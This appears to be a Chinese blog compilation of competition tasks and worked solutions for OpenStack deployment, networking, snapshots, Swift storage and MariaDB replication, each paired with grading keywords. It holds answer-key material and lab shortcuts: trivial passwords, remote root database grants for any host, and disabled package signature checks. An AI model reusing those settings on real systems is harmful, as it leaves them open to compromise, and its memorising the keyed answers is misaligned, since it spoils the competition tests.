 || OS::Neutron::FloatingIPAssociation       || OS::Neutron::FlowClassifier              || OS::Neutron::MeteringLabel               || OS::Neutron::MeteringRule                || OS::Neutron::Net                         || OS::Neutron::NetworkGateway              || OS::Neutron::Port                        || OS::Neutron::PortPair                    || OS::Neutron::ProviderNet                 || OS::Neutron::Quota                       || OS::Neutron::RBACPolicy                  || OS::Neutron::Router                      || OS::Neutron::RouterInterface             || OS::Neutron::SecurityGroup               || OS::Neutron::SecurityGroupRule           || OS::Neutron::Subnet                      || OS::Neutron::SubnetPool                  || OS::Nova::Flavor                         || OS::Nova::FloatingIP                     || OS::Nova::FloatingIPAssociation          || OS::Nova::HostAggregate                  || OS::Nova::KeyPair                        || OS::Nova::Quota                          || OS::Nova::Server                         || OS::Nova::ServerGroup                    || OS::Senlin::Cluster                      || OS::Senlin::Node                         || OS::Senlin::Policy                       || OS::Senlin::Profile                      || OS::Senlin::Receiver                     |+------------------------------------------+# 查看可用于编排的模板版本[root@controller opt]# openstack orchestration template version list+--------------------------------------+------+------------------------------+| Version                              | Type | Aliases                      |+--------------------------------------+------+------------------------------+| AWSTemplateFormatVersion.2010-09-09  | cfn  |                              || HeatTemplateFormatVersion.2012-12-12 | cfn  |                              || heat_template_version.2013-05-23     | hot  |                              || heat_template_version.2014-10-16     | hot  |                              || heat_template_version.2015-04-30     | hot  |                              || heat_template_version.2015-10-15     | hot  |                              || heat_template_version.2016-04-08     | hot  |                              || heat_template_version.2016-10-14     | hot  | heat_template_version.newton || heat_template_version.2017-02-24     | hot  | heat_template_version.ocata  || heat_template_version.2017-09-01     | hot  | heat_template_version.pike   || heat_template_version.2018-03-02     | hot  | heat_template_version.queens |+--------------------------------------+------+------------------------------+# 在/root/下编写 server.yaml 文件[root@controller ~]# vim server.yaml# server.yaml 文件内容[root@controller ~]# cat server.yaml heat_template_version: 2015-04-30	# 使用的heat模板版本description: Create Flavor		# 描述信息resources: 		# 定义资源        flavor:		# 在模板的资源部分中必须是唯一的资源ID         type: OS::Nova::Flavor	# 资源类型，这里表示一个 Flavor 类型         properties:		# 资源特定属性的列表。                name: &quot;m1.flavor&quot;	# Flavor类型的名称属性                flavorid: &quot;1234&quot;	# id属性，如果没有指定则会自动生成UUID                disk: 20		# 磁盘大小默认是GB                ram: 1024		# 内存大小必须是MB                vcpus: 1outputs:	# 定义输出信息  flavor_info:	# 输出信息的名称    description: Get the information of virtual machine type	# 输出描述    value: &#123; get_attr: [ flavor, show ] &#125;	# get_attr 从相应资源定义创建的实例在运行时解析其属性值进行输出# 创建资源栈[root@controller ~]# heat stack-create m1_flavor_stack -f server.yamlWARNING (shell) &quot;heat stack-create&quot; is deprecated, please use &quot;openstack stack create&quot; insteadWARNING (shell) &quot;heat stack-list&quot; is deprecated, please use &quot;openstack stack list&quot; instead+--------------------------------------+-----------------+--------------------+----------------------+--------------+----------------------------------+| id                                   | stack_name      | stack_status       | creation_time        | updated_time | project                          |+--------------------------------------+-----------------+--------------------+----------------------+--------------+----------------------------------+| cb5d6ca6-9106-46f3-aa7d-8f85f0a86461 | m1_flavor_stack | CREATE_IN_PROGRESS | 2022-04-10T09:50:46Z | None         | d27d72c12d3b46b89572df53a71e5d04 |+--------------------------------------+-----------------+--------------------+----------------------+--------------+----------------------------------+# 查看资源栈列表[root@controller ~]# openstack stack list+--------------------------------------+-----------------+----------------------------------+-----------------+----------------------+--------------+| ID                                   | Stack Name      | Project                          | Stack Status    | Creation Time        | Updated Time |+--------------------------------------+-----------------+----------------------------------+-----------------+----------------------+--------------+| 5a4b1816-aaf6-4739-83e5-4001c80d89d1 | m1_flavor_stack | d27d72c12d3b46b89572df53a71e5d04 | CREATE_COMPLETE | 2022-04-10T10:31:32Z | None         |+--------------------------------------+-----------------+----------------------------------+-----------------+----------------------+--------------+## Stack Status 显示  CREATE_COMPLETE 表示创建成功# 查看指定栈的详细信息[root@controller ~]# openstack stack show m1_flavor_stack+-----------------------+--------------------------------------------------------------------------------------------------------------------------------+| Field                 | Value                                                                                                                          |+-----------------------+--------------------------------------------------------------------------------------------------------------------------------+| id                    | 5a4b1816-aaf6-4739-83e5-4001c80d89d1                                                                                           || stack_name            | m1_flavor_stack                                                                                                                || description           | Create Flavor                                                                                                                  || creation_time         | 2022-04-10T10:31:32Z                                                                                                           || updated_time          | None                                                                                                                           || stack_status          | CREATE_COMPLETE                                                                                                                || stack_status_reason   | Stack CREATE completed successfully                                                                                            || parameters            | OS::project_id: d27d72c12d3b46b89572df53a71e5d04                                                                               ||                       | OS::stack_id: 5a4b1816-aaf6-4739-83e5-4001c80d89d1                                                                             ||                       | OS::stack_name: m1_flavor_stack                                                                                                ||                       |                                                                                                                                || outputs               | - description: Get the information of virtual machine type                                                                     ||                       |   output_key: flavor_info                                                                                                      ||                       |   output_value:                                                                                                                ||                       |     OS-FLV-DISABLED:disabled: false                                                                                            ||                       |     OS-FLV-EXT-DATA:ephemeral: 0                                                                                               ||                       |     disk: 20                                                                                                                   ||                       |     id: &#x27;1234&#x27;                                                                                                                 ||                       |     links:                                                                                                                     ||                       |     - href: http://controller:8774/v2.1/flavors/1234                                                                           ||                       |       rel: self                                                                                                                ||                       |     - href: http://controller:8774/flavors/1234                                                                                ||                       |       rel: bookmark                                                                                                            ||                       |     name: m1.flavor                                                                                                            ||                       |     os-flavor-access:is_public: true                                                                                           ||                       |     ram: 1024                                                                                                                  ||                       |     rxtx_factor: 1.0                                                                                                           ||                       |     swap: &#x27;&#x27;                                                                                                                   ||                       |     vcpus: 1                                                                                                                   ||                       |                                                                                                                                || links                 | - href: http://controller:8004/v1/d27d72c12d3b46b89572df53a71e5d04/stacks/m1_flavor_stack/5a4b1816-aaf6-4739-83e5-4001c80d89d1 ||                       |   rel: self                                                                                                                    ||                       |                                                                                                                                || parent                | None                                                                                                                           || disable_rollback      | True                                                                                                                           || deletion_time         | None                                                                                                                           || stack_user_project_id | 374ce98267964767adacf91527ac0412                                                                                               || capabilities          | []                                                                                                                             || notification_topics   | []                                                                                                                             || stack_owner           | None                                                                                                                           || timeout_mins          | None                                                                                                                           || tags                  | None                                                                                                                           |+-----------------------+--------------------------------------------------------------------------------------------------------------------------------+

3．在openstack私有云平台上，通过使用命令创建云主机外部网络extnet，子网extsubnet，虚拟机浮动 IP 网段为192.168.x.0&#x2F;24（其中x是考位号）， 网关为192.168.x.1，网络使用vlan模式；创建云主机内网intnet，子网intsubnet，虚拟机子网 IP 网段为10.0.x.0&#x2F;24（其中x是考位号），网关为10.0.x.1；完成内网子网intsubnet和外部网络extnet的连通。
#创建网络openstack network create extnet --provider-network-type vlan --external --provider-physical-network provider #绑定子网 openstack subnet create extsubnet --network extnet  --dhcp --gateway 192.168.200.1 --allocation-pool start=192.168.200.100,end=192.168.200.200 --subnet-range 192.168.200.0/24#创建内网openstack network create intnet --internal#绑定子网openstack subnet create intsubnet --network intnet  --dhcp --gateway 10.10.200.1 --allocation-pool start=10.10.200.100,end=10.10.200.200 --subnet-range 10.10.200.0/24#创建路由openstack router create ext-router  --enableopenstack router set --enable --enable-snat --external-gateway extnet ext-router#子网连通openstack router add subnet ext-router intsubnet

4．在openstack私有云平台上，基于“cirros” 镜像、m1.flavor、 intsubnet的网络，绑定浮动IP，通过使用命令创建一台云主机VM1，启动VM1，并使用PC机能远程登录到VM1。
#若无法连接虚拟机vm1可能是外部网络的模式不正确。可以修改网络模式#创建云主机nova boot --image cirros --flavor m1.flavor --nic net-name=intnet VM1 #创建浮动ipopenstack floating  ip create extnet#查看浮动ip的idopenstack floating ip list#绑定openstack server add floating ip VM1 7bf5fa40-ec57-4abf-a666-b65082102a22

5．在Controller节点中编写名为modvm.sh的shell脚本查看云主机VM1的内存大小，如果内存小于2G，调整云主机VM1的内存为2G。
所有节点
vim /etc/nova/nova.conf[DEFAULT]allow_resize_to_same_host=Truescheduler_default_filters=RetryFilter,AvailabilityZoneFilter,RamFilter,ComputeFilter,ComputeCapabilitiesFilter,ImagePropertiesFilter,ServerGroupAntiAffinityFilter,ServerGroupAffinityFilter#controllersystemctl restart openstack-nova-api.service openstack-nova-scheduler.service openstack-nova-conductor.service openstack-nova-novncproxy.service#computesystemctl restart libvirtd.service openstack-nova-compute.service

编写脚本
#!/bin/bashsource /etc/keystone/admin-openrc.shnova show VM1 | grep flavor:ram  &gt; ab=$(awk &#x27;&#123;print $4&#125;&#x27; a)echo $bif [ &quot;$b&quot; -le &quot;2048&quot; ]; then    openstack server  resize VM1 --flavor centosfiecho &#x27;运行结束！&#x27;


在openstack私有云平台上，将云主机VM1保存为qcow2格式的快照并保存到controller节点&#x2F;root&#x2F;cloudsave目录下。
方法一
#关闭云主机openstack server stop VM1#查看云主机在那个节点上openstack server show VM1#进入后端cd /var/lib/nova/instances/0aa53421-7363-415a-a08d-228023a6b857/#创建qcow2格式的快照 qemu-img convert -c -O qcow2 disk VM1.qcow2 -h#保存到/root/cloudsave目录下 mkdir /root/cloudsave mv VM1.qcow2 /root/cloudsave #查看详细信息  qemu-img info vm1.qcow2image: vm1.qcow2file format: qcow2virtual size: 20G (21474836480 bytes)disk size: 13Mcluster_size: 65536Format specific information:    compat: 1.1    lazy refcounts: false    refcount bits: 16    corrupt: false

方法二


#关闭云主机openstack server stop VM1#创建快照文件openstack server image create  VM1 --name demo#将快照保存到/root/cloudsavemkdir /root/cloudsave/openstack image save demo --file /root/cloudsave/demo.qcow2#查看详细信息qemu-img info demo.qcow2image: demo.qcow2file format: qcow2virtual size: 20G (21474836480 bytes)disk size: 21Mcluster_size: 65536Format specific information:    compat: 1.1    lazy refcounts: false    refcount bits: 16    corrupt: false

7．在controller节点上新建名为Chinaskill的容器，并获取该容器的存放路径；将 centos7_5.qcow2 镜像上传到chinaskill容器中，并设置分段存放， 每一段大小为 10M。
#新建Chinaskill容器swift post Chinaskill#上传镜像并分段存放swift upload Chinaskill -S 10485760 CentOS_7.5_x86_64_XD.qcow2#查看信息swift stat Chinaskill CentOS_7.5_x86_64_XD.qcow2               Account: AUTH_d58a1b0d053d4fd7ac1ddd98131973b3             Container: Chinaskill                Object: opt/openstack/images/CentOS_7.5_x86_64_XD.qcow2          Content Type: application/octet-stream        Content Length: 510459904         Last Modified: Wed, 12 Oct 2022 01:41:17 GMT                  ETag: &quot;7d5003b2fb7a024c3abd9510bf6198fa&quot;              Manifest: Chinaskill_segments/opt/openstack/images/CentOS_7.5_x86_64_XD.qcow2/1603918661.000000/510459904/10485760/            Meta Mtime: 1603918661.000000         Accept-Ranges: bytes           X-Timestamp: 1665538876.17294            X-Trans-Id: tx97c10bc263f64a93a2ea6-0063461ddaX-Openstack-Request-Id: tx97c10bc263f64a93a2ea6-0063461dda

8． 登录172.17.x.10&#x2F;dashboard，使用centos7镜像创建三台云主机来搭建rabbitmq集群。使用普通集群模式，其中一台做磁盘节点，另外两台做内存节点，配置完毕后启动rabbitmq服务。


9．使用镜像 centos7，创建两台云主机master和slave，并分别绑定浮动IP；在这2台云主机上安装mysql据库系统并配置为主从数据库（master为主节点、slave为从节点）；并mater云主机的数据库中创建ChinaSkilldb库，在ChinaSkilldb库中创建表testable (id int not null primary key,Teamname varchar(50), remarks varchar(255))，在表中插入记录(1,”Cloud”,”ChinaSkill”)。
#修改yum源mv /etc/yum.repos.d/* /etc/yumcat /etc/yum.repos.d/http.repo[centos]name=centosbaseurl=ftp://192.168.100.10/centosgpgcheck=0enabled=1[openstack]name=openstackbaseurl=ftp://192.168.100.10/openstack/iaas-repogpgcheck=0enabled=1#更新缓存区yum repolist#修改主机映射#注意修改主机名10.10.200.101 master 10.10.200.109 slave#安装mariadb所有节点yum install -y mariadb mariadb-server #（安装数据库以及服务）systemctl start mariadb    #（启动数据库） systemctl enable mariadb   #（设置开机自启）#初始化数据库(所有节点)mysql_secure_installation   回车 y 123456 123456 y n y y#修改主节点cat /etc/my.cnf [mysqld] log_bin = mysql-bin #记录操作日志 binlog_ignore_db = mysql #不同步MySQL系统数据库 server_id = 18 #数据库集群中的每个节点id都要不同 datadir=/var/lib/mysql socket=/var/lib/mysql/mysql.sock symbolic-links=0 #从节点添加server_id（注意要不一致）#重启服务systemctl restart mariadb#主节点mysql -uroot -p123456 #授权在任何客户端机器上可以以 root用户登录到数据库 grant all privileges on *.* to root@&#x27;%&#x27; identified by &quot;123456&quot;; #在主节点db1数据库上创建一个user用户让从节点db2连接  grant replication slave on *.* to &#x27;user&#x27;@&#x27;db2&#x27; identified by &#x27;123456&#x27;;#从节点mysql -uroot -p123456change master to master_host=&#x27;db1&#x27;,master_user=&#x27;user&#x27;,master_password=&#x27;123456&#x27;;start slave;show slave status\G #Slave_IO_Running和Slave_SQL_Running的状态都为YES#主节点创建数据库create database Chinaskilldb; use  Chinaskilldb  ;create table testtable(id int not null primary key,Teamname varchar(50), remarks varchar(255));insert into testtable values (1,&quot;Cloud&quot;,&quot;ChinaSkill&quot;);

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年金砖大赛</title>
    <url>/posts/a8884406.html</url>
    <content><![CDATA[A模块题目：OpenStack 平台部署与运维业务场景：
某企业拟使用OpenStack搭建一个企业云平台，用于部署各类企业应用对外对内服务。云平台可实现IT资源池化、弹性分配、集中管理、性能优化以及统一安全认证等。系统结构如下图：
企业云平台的搭建使用竞赛平台提供的两台云服务器，配置如下表：
表1 IP地址规划



设备名称
主机名
接口
IP地址



云服务器1
controller
eth0
公网IP: 私网IP:192.168.100.&#x2F;24




eth1
私网IP:192.168.200. *&#x2F;24


云服务器2
compute
eth0
公网IP: 私网IP:192.168.100. *&#x2F;24




eth1
私网IP:192.168.200. *&#x2F;24


说明：
1.选手自行检查工位pc机硬件及网络是否正常；
2.竞赛使用集群模式进行，给每个参赛队提供华为云账号和密码及考试系统的账号和密码。选手通过用户名与密码分别登录华为云和考试系统；
3.竞赛用到的软件包都在云主机&#x2F;root下。
4.表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。
任务1 1私有云平台环境初始化（5 分）1.配置主机名​	把controller节点主机名设置为controller,compute 节点主机名设置为compute,修改hosts文件将IP地址映射为主机名
 在controller节点将cat &#x2F;etc&#x2F;hosts命令的返回结果提交到答题框。【1分】
标准: controller&amp;&amp;compute&amp;&amp;192.168.100
解法:
[root@localhost ~]# hostnamectl set-hostname controller[root@localhost ~]# bash[root@localhost ~]# hostnamectl set-hostname compute[root@localhost ~]# bash[root@controller ~]# hostnamecontroller[root@compute ~]# hostnamecompute[root@controller ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.10 controller192.168.100.20 compute[root@compute ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.10 controller192.168.100.20 compute

2.挂载光盘镜像在controller节点的root目录下有CentOS-7-x86_64-DVD-2009.iso和openstack-train.tar.gz，在&#x2F;opt下创建centos目录，将镜像文件CentOS-7-x86_64-DVD-2009.iso挂载到&#x2F;opt&#x2F;centos下，将openstack-train.tar.gz解压到&#x2F;opt目录下，并创建本地yum源local.repo。
在controller节点将yum list | grep glance命令的返回结果提交到答题框。【1分】
标准: openstack-glance&amp;&amp;python2-glance&amp;&amp;python2-glance-store
解法:
[root@controller ~]# mv /opt/CentOS-7-x86_64-DVD-2009.iso /root/[root@controller ~]# mkdir /opt/centos[root@controller ~]# tar -zxvf /root/openstack-train.tar.gz -C /opt/# 进行挂载[root@controller ~]# mount /root/CentOS-7-x86_64-DVD-2009.iso /opt/centos/# 配置controller 本地yum源[root@controller ~]# vim /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[openstack]name=openstackbaseurl=file:///opt/openstackgpgcheck=0enabled=1[root@controller ~]# yum list | grep glanceopenstack-glance.noarch                    1:19.0.4-1.el7              openstackpython2-glance.noarch                      1:19.0.4-1.el7              openstackpython2-glance-store.noarch                1.0.1-1.el7                 openstackpython2-glanceclient.noarch                1:2.17.1-1.el7              openstack

3.搭建ftp服务器在controller节点上安装vsftp服务,将&#x2F;opt目录设为共享，并设置为开机自启动，然后重启服务生效；在compute节点创建FTP源ftp.repo，使用controller节点为FTP服务器，配置文件中的FTP地址使用主机名。
在compute节点将cat &#x2F;etc&#x2F;yum.repos.d&#x2F;ftp.repo命令的返回结果提交到答题框。【1分】
标准: controller&#x2F;centos&amp;&amp;controller&#x2F;openstack
解法:
# 安装vsftpd[root@controller ~]# yum install vsftpd -y# 配置/opt目录进行共享[root@controller ~]# echo anon_root=/opt &gt;&gt; /etc/vsftpd/vsftpd.conf# 重启并设置开机自启动[root@controller ~]# systemctl restart vsftpd[root@controller ~]# systemctl enable vsftpd[root@controller ~]# cat /etc/vsftpd/vsftpd.conf | grep /opt  anon_root=/opt[root@controller ~]# systemctl status vsftpd | grep -P Loaded\|Active   Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; enabled; vendor preset: disabled)   Active: active (running) since Wed 2023-02-22 22:01:15 CST; 9min ago# 配置compute ftp源[root@compute ~]# vim /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://controller/centosgpgcheck=0enabled=1[openstack]name=openstackbaseurl=ftp://controller/openstackgpgcheck=0enabled=1

4.分区在compute节点将vdb分为两个区分别为vdb1和vdb2,大小自定义(如果是sdb,则分为sdb1和sdb2)。要求分区格式为gpt,使用mkfs.xfs命令对文件系统格式化。
将lsblk -f命令的返回结果提交到答题框。【1分】
标准: db1&amp;&amp;db2&amp;&amp;xfs
解法:
[root@compute ~]# parted /dev/vdb mklabel gptInformation: You may need to update /etc/fstab.[root@compute ~]# parted /dev/vdb(parted) mkpart        Partition name?  []? f1File system type?  [ext2]? xfsStart? 0G              End? 20G (parted) mkpartPartition name?  []? f2File system type?  [ext2]? xfsStart? 20G             End? 100G(parted) quit[root@compute ~]# mkfs.xfs /dev/vdb1[root@compute ~]# mkfs.xfs /dev/vdb2[root@compute ~]# lsblk -fNAME   FSTYPE LABEL UUID                                 MOUNTPOINTvda                                                     └─sda1 xfs          5f1871e2-c19c-4f86-8d6c-04d5fda71a0a /sdb                                                     ├─vdb1 xfs          91b262c1-1767-4968-9563-8174e3accdeb└─vdb2 xfs          721a62f9-a00b-4ddf-9454-24bb65090b8b

5.系统调优-脏数据回写Linux系统内存中会存在脏数据，一般系统默认脏数据占用内存30%时会回写磁盘，修改系统配置文件，要求将回写磁盘的大小调整为60%。
在controller节点将sysctl -p命令的返回结果提交到答题框。【1分】
标准: vm.dirty_ratio&amp;&amp;60
解法:
[root@controller ~]# echo vm.dirty_ratio = 60 &gt;&gt; /etc/sysctl.conf[root@controller ~]# sysctl -pvm.dirty_ratio = 60

任务2 OpenStack搭建任务 (8分)1.修改脚本文件在controller节点和compute节点分别安装sh-guoji软件包，修改脚本文件基本变量（脚本文件为&#x2F;root&#x2F;variable.sh），修改完成后使用命令生效该脚本文件并替换到compute节点对应位置。
在controller节点请将echo $HOST_NAME $HOST_NAME_NODE命令的返回结果提交到答题框。【1分】
标准: controller&amp;&amp;compute
[root@controller ~]# yum install sh-guoji -y[root@compute ~]# yum install sh-guoji -y# 配置[root@controller ~]# cat /root/variable.sh | grep -Ev &quot;^$|#&quot;                     HOST_IP=192.168.100.xHOST_PASS=000000HOST_NAME=controllerHOST_IP_NODE=192.168.100.xHOST_PASS_NODE=000000HOST_NAME_NODE=computenetwork_segment_IP=192.168.100.0/24RABBIT_USER=openstackRABBIT_PASS=000000DB_PASS=000000ADMIN_PASS=000000DEMO_PASS=000000KEYSTONE_DBPASS=000000GLANCE_DBPASS=000000GLANCE_PASS=000000NOVA_DBPASS=000000NOVA_PASS=000000NEUTRON_DBPASS=000000NEUTRON_PASS=000000METADATA_SECRET=000000INTERFACE_IP_HOST=192.168.100.xINTERFACE_IP_NODE=192.168.100.xINTERFACE_NAME_HOST=eth0INTERFACE_NAME_NODE=eth0Physical_NAME=providerminvlan=100maxvlan=200CINDER_DBPASS=000000CINDER_PASS=000000BLOCK_DISK=vdb1SWIFT_PASS=000000OBJECT_DISK=vdb2STORAGE_LOCAL_NET_IP=192.168.100.xHEAT_DBPASS=000000HEAT_PASS=000000#复制到compute节点[root@controller ~]# scp /root/variable.sh compute:/root/[root@controller ~]# source /root/variable.sh[root@controller ~]# echo $HOST_NAME $HOST_NAME_NODEcontroller compute

2.安装openstack基础组件分别在controller节点和compute节点执行openstack-completion.sh文件(执行完闭需重连终端)。
在controller节点将openstack –version命令的返回结果提交到答题框。【1分】
标准: openstack&amp;&amp;4.0.2
解法:
[root@controller ~]# openstack-completion.sh[root@compute ~]# openstack-completion.sh[root@controller ~]# openstack --versionopenstack 4.0.2

3.搭建数据库组件在controller节点执行openstack-controller-mysql.sh脚本，会自行安装mariadb、memcached、rabbitmq等服务和完成相关配置。执行完成后修改配置文件将缓存CACHESIZE修改为128,并重启相应服务。
将ps aux|grep memcached命令的返回结果提交到答题框。【1分】
标准: memcached&amp;&amp;128
解法:
# 执行mysql脚本[root@controller ~]# openstack-controller-mysql.sh# 修改memcached缓存CACHESIZE[root@controller ~]# vim /etc/sysconfig/memcachedPORT=&quot;11211&quot;USER=&quot;memcached&quot;MAXCONN=&quot;1024&quot;CACHESIZE=&quot;128&quot;OPTIONS=&quot;-l 127.0.0.1,::1,controller&quot;#重启服务[root@controller ~]# systemctl restart memcached[root@controller ~]# ps aux|grep memcachedmemcach+  14171  0.0  0.0 443060  2164 ?        Ssl  23:43   0:00 /usr/bin/memcached -p 11211 -u memcached -m 128 -c 1024 -l 127.0.0.1,::1,controllerroot      14186  0.0  0.0 112808   968 pts/0    S+   23:43   0:00 grep --color=auto memcached

4.搭建认证服务组件在controller节点执行openstack-controller-keystone.sh脚本，会自行安装keystone服务和完成相关配置。使用openstack命令，创建一个名为tom的账户，密码为tompassword123,邮箱为&#x74;&#111;&#x6d;&#64;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#111;&#109;。
将openstack user show tom命令的返回结果提交到答题框。【1分】
标准: id&amp;&amp;&#x74;&#x6f;&#x6d;&#64;&#101;&#120;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#99;&#111;&#x6d;&amp;&amp;password_expires_at
解法:
[root@controller ~]# openstack-controller-keystone.sh#创建账户[root@controller ~]# source admin-openrc[root@controller ~]# openstack user create --password tompassword123 --email tom@example.com tom[root@controller ~]# openstack user show tom+---------------------+----------------------------------+| Field               | Value                            |+---------------------+----------------------------------+| domain_id           | default                          || email               | tom@example.com                  || enabled             | True                             || id                  | e20fb9c5f8ec4e4d98b5e1848d6c8b26 || name                | tom                              || options             | &#123;&#125;                               || password_expires_at | None                             |+---------------------+----------------------------------+

5.搭建镜像服务组件在controller节点执行openstack-controller-glance.sh脚本，会自行安装glance服务和完成相关配置。完成后使用openstack命令,创建一个qcow2格式，名为cirros_0.3.4的镜像，镜像文件使用cirros-0.3.4-x86_64-disk.img。
将openstack image show cirros_0.3.4命令的返回结果提交到答题框。【1分】
标准:  disk_format&amp;&amp;qcow2&amp;&amp;cirros_0.3.4&amp;&amp;13287936
解法:
[root@controller ~]# openstack-controller-glance.sh# 创建镜像[root@controller ~]# source admin-openrc[root@controller ~]# openstack image create --container-format bare --disk-format qcow2 --file /root/cirros-0.3.4-x86_64-disk.img --public cirros_0.3.4[root@controller ~]# openstack image show cirros_0.3.4+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Field            | Value                                                                                                                                                                                      |+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                                                                                                                                                           || container_format | bare                                                                                                                                                                                       || created_at       | 2023-03-07T06:15:49Z                                                                                                                                                                       || disk_format      | qcow2                                                                                                                                                                                      || file             | /v2/images/07d1a62d-7d20-4564-ba78-75841308ce59/file                                                                                                                                       || id               | 07d1a62d-7d20-4564-ba78-75841308ce59                                                                                                                                                       || min_disk         | 0                                                                                                                                                                                          || min_ram          | 0                                                                                                                                                                                          || name             | cirros_0.3.4                                                                                                                                                                               || owner            | de20c5e28ce6426fb23f764019b47a54                                                                                                                                                           || properties       | os_hash_algo=&#x27;sha512&#x27;, os_hash_value=&#x27;1b03ca1bc3fafe448b90583c12f367949f8b0e665685979d95b004e48574b953316799e23240f4f739d1b5eb4c4ca24d38fdc6f4f9d8247a2bc64db25d6bbdb2&#x27;, os_hidden=&#x27;False&#x27; || protected        | False                                                                                                                                                                                      || schema           | /v2/schemas/image                                                                                                                                                                          || size             | 13287936                                                                                                                                                                                   || status           | active                                                                                                                                                                                     || tags             |                                                                                                                                                                                            || updated_at       | 2023-03-07T06:15:49Z                                                                                                                                                                       || virtual_size     | None                                                                                                                                                                                       || visibility       | public                 



6.搭建计算服务组件在controller节点执行openstack-controller-nova.sh，compute节点执行openstack-compute-nova.sh，会自行安装nova服务和完成相关配置。使用openstack命令创建一个名为m1,ID为56，内存为2048MB,磁盘容量为20GB,vCPU数量为2的云主机类型。
在controller节点将openstack flavor show m1命令的返回结果提交到答题框。【1分】
标准:disk&amp;&amp;20&amp;&amp;name&amp;&amp;m1&amp;&amp;ram&amp;&amp;2048&amp;&amp;id&amp;&amp;56&amp;&amp;vcpus&amp;&amp;properties
解法:
[root@controller ~]# openstack-controller-nova.sh  [root@compute ~]# openstack-compute-nova.sh [root@controller ~]# source admin-openrc[root@controller ~]# openstack flavor create --id 56 --ram 2048 --disk 20 --vcpus 2 m1+----------------------------+-------+| Field                      | Value |+----------------------------+-------+| OS-FLV-DISABLED:disabled   | False || OS-FLV-EXT-DATA:ephemeral  | 0     || disk                       | 20    || id                         | 56    || name                       | m1    || os-flavor-access:is_public | True  || properties                 |       || ram                        | 2048  || rxtx_factor                | 1.0   || swap                       |       || vcpus                      | 2     |+----------------------------+-------+[root@controller ~]# openstack flavor show m1+----------------------------+-------+| Field                      | Value |+----------------------------+-------+| OS-FLV-DISABLED:disabled   | False || OS-FLV-EXT-DATA:ephemeral  | 0     || access_project_ids         | None  || disk                       | 20    || id                         | 56    || name                       | m1    || os-flavor-access:is_public | True  || properties                 |       || ram                        | 2048  || rxtx_factor                | 1.0   || swap                       |       || vcpus                      | 2     |+----------------------------+-------+

7.搭建网络组件并初始化网络在controller节点执行openstack-controller-neutron.sh,compute节点执行openstack-compute-neutron.sh，会自行安装neutron服务并完成配置。创建云主机外部网络ext-net，子网为ext-subnet，云主机浮动 IP 可用网段为 192.168.200.100~192.168.200.200，网关为 192.168.200.1。
在controller节点将openstack subnet show ext-subnet命令的返回结果提交到答题框。【1分】
标准: 192.168.200.100-192.168.200.200&amp;&amp;allocation_pools&amp;&amp;gateway_ip&amp;&amp;192.168.200.1&amp;&amp;ext-subnet&amp;&amp;project_id
[root@controller ~]# openstack-controller-neutron.sh[root@compute ~]# openstack-compute-neutron.sh   # 创建网络[root@controller ~]# source admin-openrc[root@controller ~]# openstack network create --external ext-net# 创建子网[root@controller ~]# openstack subnet create --ip-version 4 --gateway 192.168.200.1 --allocation-pool start=192.168.200.100,end=192.168.200.200 --network ext-net --subnet-range 192.168.200.0/24 ext-subnet[root@controller ~]# openstack subnet show ext-subnet+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+| Field             | Value                                                                                                                                                   |+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+| allocation_pools  | 192.168.200.100-192.168.200.200                                                                                                                         || cidr              | 192.168.200.0/24                                                                                                                                        || created_at        | 2023-02-22T16:29:20Z                                                                                                                                    || description       |                                                                                                                                                         || dns_nameservers   |                                                                                                                                                         || enable_dhcp       | True                                                                                                                                                    || gateway_ip        | 192.168.200.1                                                                                                                                           || host_routes       |                                                                                                                                                         || id                | 6ab2ab75-3a82-44d5-9bc8-c2c0a65872d6                                                                                                                    || ip_version        | 4                                                                                                                                                       || ipv6_address_mode | None                                                                                                                                                    || ipv6_ra_mode      | None                                                                                                                                                    || location          | cloud=&#x27;&#x27;, project.domain_id=, project.domain_name=&#x27;Default&#x27;, project.id=&#x27;ce21284fd468495995218ea6e1aeea2a&#x27;, project.name=&#x27;admin&#x27;, region_name=&#x27;&#x27;, zone= || name              | ext-subnet                                                                                                                                              || network_id        | bc39443b-9ef8-4a4d-91b3-fd2637ada43f                                                                                                                    || prefix_length     | None                                                                                                                                                    || project_id        | ce21284fd468495995218ea6e1aeea2a                                                                                                                        || revision_number   | 0                                                                                                                                                       || segment_id        | None                                                                                                                                                    || service_types     |                                                                                                                                                         || subnetpool_id     | None                                                                                                                                                    || tags              |                                                                                                                                                         || updated_at        | 2023-02-22T16:29:20Z 

8.搭建图形化界面在 controller节点执行openstack-controller-dashboard.sh脚本，会自行安装 dashboard服务并完成配置。请修改compute节点nova配置文件，使之后创建的实例可以在网页通过公网访问控制台页面。
在compute节点请将cat &#x2F;etc&#x2F;nova&#x2F;nova.conf | grep 公网IP 命令的返回结果提交到答题框。（例:cat &#x2F;etc&#x2F;nova&#x2F;nova.conf | grep 121.36.12.138）【1分】
标准: novncproxy_base_url&amp;&amp;vnc_auto.html
解法:
[root@controller ~]# openstack-controller-dashboard.sh[root@compute ~]# vim /etc/nova/nova.conf修改内容如下novncproxy_base_url = http://公网IP:6080/vnc_auto.html[root@compute ~]# cat /etc/nova/nova.conf | grep 公网IPnovncproxy_base_url = http://公网IP:6080/vnc_auto.html

